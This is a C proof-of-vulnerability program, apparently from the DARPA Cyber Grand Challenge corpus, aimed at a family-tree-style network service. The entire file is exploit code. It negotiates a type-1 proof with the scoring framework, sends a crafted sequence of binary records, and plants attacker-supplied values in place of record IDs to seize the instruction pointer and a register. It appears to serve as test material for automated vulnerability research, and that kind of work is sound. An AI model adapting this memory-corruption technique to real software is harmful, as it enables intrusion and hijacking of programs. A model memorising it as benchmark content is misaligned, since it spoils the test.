/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#include <libpov.h>
int main(void) {
   type1_vals t1vals = { 0 };
   uint32_t mask_eip, mask_reg;

   mask_eip = 0x0FFFFFFF;
   mask_reg = 0x0FFFFFFF;
   type1_negotiate(mask_eip, mask_reg, 2, &t1vals);

   t1vals.ipval |= 0xF0000000;   // make sure out of range of valid fn ptrs
   t1vals.regval |= 0xF0000000;  // make sure out of range of valid fn ptrs

   // parent2 regval
   // parent3 ipval
   unsigned int p2_val = t1vals.regval;
   unsigned int p3_val = t1vals.ipval;
   do {
      //*** writing data (child)
      static unsigned char write_00000_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x1f\xbc\x00\x00\x00\x4d\x66\x59"
         "\x55\x54\x78\x58\x53\x6e\x49\x53\x70\x54\x58\x43\x75\x65\x79\x6a"
         "\x7a\x50\x47\x63\x52\x59\x6c\x6e\x61\x70\x63\x76";
      static unsigned int write_00000_00000_len = 44;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 4;
      read_00000 = (unsigned char*)malloc(read_00000_len);
      int read_00000_res = length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x2e\xa5\x00\x00\x34\x1f\x4c\x57"
         "\x68\x6e\x42\x69\x58\x73\x51\x66\x4e\x4c\x74\x65\x44\x42\x54\x67"
         "\x76\x57\x4b\x74\x75\x46\x44\x49\x4c\x57\x4b\x73";
      static unsigned int write_00001_00000_len = 44;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         transmit_all(1, write_00001, write_00001_len);
      }
      free(write_00001);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 4;
      read_00001 = (unsigned char*)malloc(read_00001_len);
      int read_00001_res = length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data (parent1)
      static unsigned char write_00002_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\xd8\xc0\x00\x00\x75\x6a\x6d\x53"
         "\x4d\x68\x53\x69\x58\x71\x61\x63\x55\x5a\x6b\x44\x4d\x43\x65\x41"
         "\x50\x4f\x5a\x75\x4b\x56\x4a\x63\x77\x48\x6d\x47";
      static unsigned int write_00002_00000_len = 44;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         transmit_all(1, write_00002, write_00002_len);
      }
      free(write_00002);
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** length read
      read_00002_len = 4;
      read_00002 = (unsigned char*)malloc(read_00002_len);
      int read_00002_res = length_read(0, read_00002, read_00002_len);
      if (read_00002_res) {} //silence unused variable warning
      free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x29\x66\x00\x00\x99\x7a\x73\x75"
         "\x75\x65\x6e\x49\x51\x4d\x6a\x73\x47\x48\x57\x76\x4f\x4c\x43\x64"
         "\x72\x42\x41\x4d\x6b\x6e\x7a\x75\x6c\x4f\x52\x5a";
      static unsigned int write_00003_00000_len = 44;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         transmit_all(1, write_00003, write_00003_len);
      }
      free(write_00003);
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** length read
      read_00003_len = 4;
      read_00003 = (unsigned char*)malloc(read_00003_len);
      int read_00003_res = length_read(0, read_00003, read_00003_len);
      if (read_00003_res) {} //silence unused variable warning
      free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x73\xd3\x00\x00\x90\x1d\x54\x68"
         "\x44\x4d\x70\x55\x4b\x74\x4c\x43\x72\x4e\x76\x4e\x79\x4f\x7a\x72"
         "\x4b\x64\x49\x65\x59\x55\x61\x46\x4c\x50\x52\x45";
      static unsigned int write_00004_00000_len = 44;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         transmit_all(1, write_00004, write_00004_len);
      }
      free(write_00004);
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** length read
      read_00004_len = 4;
      read_00004 = (unsigned char*)malloc(read_00004_len);
      int read_00004_res = length_read(0, read_00004, read_00004_len);
      if (read_00004_res) {} //silence unused variable warning
      free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data (parent2)
      static unsigned char write_00005_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x6c\x13\x00\x00\xc6\x5d\x50\x51"
         "\x66\x47\x50\x57\x79\x78\x6e\x54\x75\x77\x5a\x64\x4f\x66\x70\x72"
         "\x48\x67\x70\x72\x79\x6b\x75\x50\x6c\x63\x6b\x50";
      static unsigned int write_00005_00000_len = 44;

      unsigned int *buf = (unsigned int *)write_00005_00000;
      buf[2] = p2_val;

      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         transmit_all(1, write_00005, write_00005_len);
      }
      free(write_00005);
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** length read
      read_00005_len = 4;
      read_00005 = (unsigned char*)malloc(read_00005_len);
      int read_00005_res = length_read(0, read_00005, read_00005_len);
      if (read_00005_res) {} //silence unused variable warning
      free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x6e\xc5\x00\x00\x72\xc5\x42\x6d"
         "\x4e\x49\x6e\x54\x51\x6c\x75\x44\x5a\x6c\x57\x43\x71\x6f\x4a\x6f"
         "\x61\x4c\x49\x51\x66\x4d\x75\x47\x6b\x43\x55\x63";
      static unsigned int write_00006_00000_len = 44;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         transmit_all(1, write_00006, write_00006_len);
      }
      free(write_00006);
   } while (0);
   do {
      unsigned char *read_00006;
      unsigned int read_00006_len;
      unsigned int read_00006_ptr = 0;
      //**** length read
      read_00006_len = 4;
      read_00006 = (unsigned char*)malloc(read_00006_len);
      int read_00006_res = length_read(0, read_00006, read_00006_len);
      if (read_00006_res) {} //silence unused variable warning
      free(read_00006);
      if (read_00006_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x3e\xc0\x00\x00\x51\xb2\x70\x79"
         "\x44\x59\x77\x67\x67\x57\x48\x65\x53\x4f\x76\x55\x77\x61\x65\x75"
         "\x68\x6b\x71\x71\x61\x52\x4b\x48\x55\x63\x6d\x52";
      static unsigned int write_00007_00000_len = 44;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         transmit_all(1, write_00007, write_00007_len);
      }
      free(write_00007);
   } while (0);
   do {
      unsigned char *read_00007;
      unsigned int read_00007_len;
      unsigned int read_00007_ptr = 0;
      //**** length read
      read_00007_len = 4;
      read_00007 = (unsigned char*)malloc(read_00007_len);
      int read_00007_res = length_read(0, read_00007, read_00007_len);
      if (read_00007_res) {} //silence unused variable warning
      free(read_00007);
      if (read_00007_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data (parent3)
      static unsigned char write_00008_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x82\x24\x00\x00\xa9\x7c\x70\x41"
         "\x4e\x45\x62\x78\x44\x6b\x64\x4d\x46\x47\x76\x6f\x51\x4a\x51\x68"
         "\x76\x4d\x6d\x5a\x57\x5a\x73\x6e\x77\x57\x71\x61";
      static unsigned int write_00008_00000_len = 44;

      unsigned int *buf = (unsigned int *)write_00008_00000;
      buf[2] = p3_val;

      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = append_buf(write_00008, &write_00008_len, write_00008_00000, write_00008_00000_len);
      if (write_00008_len > 0) {
         transmit_all(1, write_00008, write_00008_len);
      }
      free(write_00008);
   } while (0);
   do {
      unsigned char *read_00008;
      unsigned int read_00008_len;
      unsigned int read_00008_ptr = 0;
      //**** length read
      read_00008_len = 4;
      read_00008 = (unsigned char*)malloc(read_00008_len);
      int read_00008_res = length_read(0, read_00008, read_00008_len);
      if (read_00008_res) {} //silence unused variable warning
      free(read_00008);
      if (read_00008_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00009_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\xa8\x13\x00\x00\x4b\x68\x62\x6c"
         "\x53\x6f\x79\x46\x64\x76\x5a\x44\x73\x42\x56\x6d\x4d\x6b\x7a\x42"
         "\x66\x69\x44\x73\x74\x6b\x61\x6e\x71\x68\x66\x41";
      static unsigned int write_00009_00000_len = 44;
      unsigned char *write_00009 = NULL;
      unsigned int write_00009_len = 0;
      write_00009 = append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
      if (write_00009_len > 0) {
         transmit_all(1, write_00009, write_00009_len);
      }
      free(write_00009);
   } while (0);
   do {
      unsigned char *read_00009;
      unsigned int read_00009_len;
      unsigned int read_00009_ptr = 0;
      //**** length read
      read_00009_len = 4;
      read_00009 = (unsigned char*)malloc(read_00009_len);
      int read_00009_res = length_read(0, read_00009, read_00009_len);
      if (read_00009_res) {} //silence unused variable warning
      free(read_00009);
      if (read_00009_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00010_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\xe1\x79\x01\x00\x74\xf8\x4c\x59"
         "\x73\x5a\x64\x42\x4d\x48\x44\x45\x6a\x56\x76\x4d\x79\x6f\x49\x4d"
         "\x79\x63\x41\x50\x45\x69\x75\x4c\x78\x6d\x73\x4b";
      static unsigned int write_00010_00000_len = 44;
      unsigned char *write_00010 = NULL;
      unsigned int write_00010_len = 0;
      write_00010 = append_buf(write_00010, &write_00010_len, write_00010_00000, write_00010_00000_len);
      if (write_00010_len > 0) {
         transmit_all(1, write_00010, write_00010_len);
      }
      free(write_00010);
   } while (0);
   do {
      unsigned char *read_00010;
      unsigned int read_00010_len;
      unsigned int read_00010_ptr = 0;
      //**** length read
      read_00010_len = 4;
      read_00010 = (unsigned char*)malloc(read_00010_len);
      int read_00010_res = length_read(0, read_00010, read_00010_len);
      if (read_00010_res) {} //silence unused variable warning
      free(read_00010);
      if (read_00010_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00011_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x71\xe1\x00\x00\x05\x0e\x69\x77"
         "\x6f\x65\x69\x64\x53\x6b\x68\x4f\x51\x69\x75\x66\x57\x54\x54\x4b"
         "\x41\x67\x53\x71\x43\x41\x79\x48\x7a\x72\x73\x68";
      static unsigned int write_00011_00000_len = 44;
      unsigned char *write_00011 = NULL;
      unsigned int write_00011_len = 0;
      write_00011 = append_buf(write_00011, &write_00011_len, write_00011_00000, write_00011_00000_len);
      if (write_00011_len > 0) {
         transmit_all(1, write_00011, write_00011_len);
      }
      free(write_00011);
   } while (0);
   do {
      unsigned char *read_00011;
      unsigned int read_00011_len;
      unsigned int read_00011_ptr = 0;
      //**** length read
      read_00011_len = 4;
      read_00011 = (unsigned char*)malloc(read_00011_len);
      int read_00011_res = length_read(0, read_00011, read_00011_len);
      if (read_00011_res) {} //silence unused variable warning
      free(read_00011);
      if (read_00011_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data union parent1, parent2
      static unsigned char write_00012_00000[] = 
         "\xf0\xf1\xf2\xf3\x08\x00\x00\x00\xd8\xc0\x00\x00\x6c\x13\x00\x00";
      static unsigned int write_00012_00000_len = 16;

      unsigned int *buf = (unsigned int *)write_00012_00000;
      buf[3] = p2_val;

      unsigned char *write_00012 = NULL;
      unsigned int write_00012_len = 0;
      write_00012 = append_buf(write_00012, &write_00012_len, write_00012_00000, write_00012_00000_len);
      if (write_00012_len > 0) {
         transmit_all(1, write_00012, write_00012_len);
      }
      free(write_00012);
   } while (0);
   do {
      unsigned char *read_00012;
      unsigned int read_00012_len;
      unsigned int read_00012_ptr = 0;
      //**** length read
      read_00012_len = 4;
      read_00012 = (unsigned char*)malloc(read_00012_len);
      int read_00012_res = length_read(0, read_00012, read_00012_len);
      if (read_00012_res) {} //silence unused variable warning
      free(read_00012);
      if (read_00012_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data adopted child child, parent1, parent2
      static unsigned char write_00013_00000[] = 
         "\xac\xac\xac\xac\x0c\x00\x00\x00\x1f\xbc\x00\x00\xd8\xc0\x00\x00"
         "\x6c\x13\x00\x00";
      static unsigned int write_00013_00000_len = 20;

      unsigned int *buf = (unsigned int *)write_00013_00000;
      buf[4] = p2_val;

      unsigned char *write_00013 = NULL;
      unsigned int write_00013_len = 0;
      write_00013 = append_buf(write_00013, &write_00013_len, write_00013_00000, write_00013_00000_len);
      if (write_00013_len > 0) {
         transmit_all(1, write_00013, write_00013_len);
      }
      free(write_00013);
   } while (0);
   do {
      unsigned char *read_00013;
      unsigned int read_00013_len;
      unsigned int read_00013_ptr = 0;
      //**** length read
      read_00013_len = 4;
      read_00013 = (unsigned char*)malloc(read_00013_len);
      int read_00013_res = length_read(0, read_00013, read_00013_len);
      if (read_00013_res) {} //silence unused variable warning
      free(read_00013);
      if (read_00013_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data separated parent1, parent2
      static unsigned char write_00014_00000[] = 
         "\x50\x11\x50\x11\x08\x00\x00\x00\xd8\xc0\x00\x00\x6c\x13\x00\x00";
      static unsigned int write_00014_00000_len = 16;

      unsigned int *buf = (unsigned int *)write_00014_00000;
      buf[3] = p2_val;

      unsigned char *write_00014 = NULL;
      unsigned int write_00014_len = 0;
      write_00014 = append_buf(write_00014, &write_00014_len, write_00014_00000, write_00014_00000_len);
      if (write_00014_len > 0) {
         transmit_all(1, write_00014, write_00014_len);
      }
      free(write_00014);
   } while (0);
   do {
      unsigned char *read_00014;
      unsigned int read_00014_len;
      unsigned int read_00014_ptr = 0;
      //**** length read
      read_00014_len = 4;
      read_00014 = (unsigned char*)malloc(read_00014_len);
      int read_00014_res = length_read(0, read_00014, read_00014_len);
      if (read_00014_res) {} //silence unused variable warning
      free(read_00014);
      if (read_00014_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data union parent2, parent3
      static unsigned char write_00015_00000[] = 
         "\xf0\xf1\xf2\xf3\x08\x00\x00\x00\x6c\x13\x00\x00\x82\x24\x00\x00";
      static unsigned int write_00015_00000_len = 16;

      unsigned int *buf = (unsigned int *)write_00015_00000;
      buf[2] = p2_val;
      buf[3] = p3_val;

      unsigned char *write_00015 = NULL;
      unsigned int write_00015_len = 0;
      write_00015 = append_buf(write_00015, &write_00015_len, write_00015_00000, write_00015_00000_len);
      if (write_00015_len > 0) {
         transmit_all(1, write_00015, write_00015_len);
      }
      free(write_00015);
   } while (0);
   do {
      unsigned char *read_00015;
      unsigned int read_00015_len;
      unsigned int read_00015_ptr = 0;
      //**** length read
      read_00015_len = 4;
      read_00015 = (unsigned char*)malloc(read_00015_len);
      int read_00015_res = length_read(0, read_00015, read_00015_len);
      if (read_00015_res) {} //silence unused variable warning
      free(read_00015);
      if (read_00015_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data separated parent2, parent3
      static unsigned char write_00016_00000[] = 
         "\x50\x11\x50\x11\x08\x00\x00\x00\x6c\x13\x00\x00\x82\x24\x00\x00";
      static unsigned int write_00016_00000_len = 16;

      unsigned int *buf = (unsigned int *)write_00016_00000;
      buf[2] = p2_val;
      buf[3] = p3_val;

      unsigned char *write_00016 = NULL;
      unsigned int write_00016_len = 0;
      write_00016 = append_buf(write_00016, &write_00016_len, write_00016_00000, write_00016_00000_len);
      if (write_00016_len > 0) {
         transmit_all(1, write_00016, write_00016_len);
      }
      free(write_00016);
   } while (0);
   do {
      unsigned char *read_00016;
      unsigned int read_00016_len;
      unsigned int read_00016_ptr = 0;
      //**** length read
      read_00016_len = 4;
      read_00016 = (unsigned char*)malloc(read_00016_len);
      int read_00016_res = length_read(0, read_00016, read_00016_len);
      if (read_00016_res) {} //silence unused variable warning
      free(read_00016);
      if (read_00016_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data adopted child child, p_unk, parent2
      static unsigned char write_00017_00000[] = 
         "\xac\xac\xac\xac\x0c\x00\x00\x00\x1f\xbc\x00\x00\x00\x00\x00\x00"
         "\x6c\x13\x00\x00";
      static unsigned int write_00017_00000_len = 20;

      unsigned int *buf = (unsigned int *)write_00017_00000;
      buf[4] = p2_val;

      unsigned char *write_00017 = NULL;
      unsigned int write_00017_len = 0;
      write_00017 = append_buf(write_00017, &write_00017_len, write_00017_00000, write_00017_00000_len);
      if (write_00017_len > 0) {
         transmit_all(1, write_00017, write_00017_len);
      }
      free(write_00017);
   } while (0);
   do {
      unsigned char *read_00017;
      unsigned int read_00017_len;
      unsigned int read_00017_ptr = 0;
      //**** length read
      read_00017_len = 4;
      read_00017 = (unsigned char*)malloc(read_00017_len);
      int read_00017_res = length_read(0, read_00017, read_00017_len);
      if (read_00017_res) {} //silence unused variable warning
      free(read_00017);
      if (read_00017_ptr) {}  //silence unused variable warning if any
   } while (0);
}
